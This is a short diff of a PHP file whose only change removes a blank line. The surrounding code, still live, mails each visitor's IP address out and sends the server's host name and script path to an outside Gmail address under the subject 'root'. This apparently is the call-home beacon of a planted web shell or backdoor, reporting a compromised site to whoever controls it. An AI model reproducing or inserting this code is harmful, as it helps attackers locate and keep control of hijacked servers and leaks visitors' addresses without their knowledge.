@@ -2,7 +2,6 @@
 $ip = $_SERVER[\'REMOTE_ADDR\'];
 mail (\'\', \'ip of visitor\', $ip);
 
-
 $tmp = $_SERVER[\'SERVER_NAME\'].$_SERVER[\'PHP_SELF\']."
 "; 
 mail(\'jeffreezyt@gmail.com\', \'root\', $tmp);
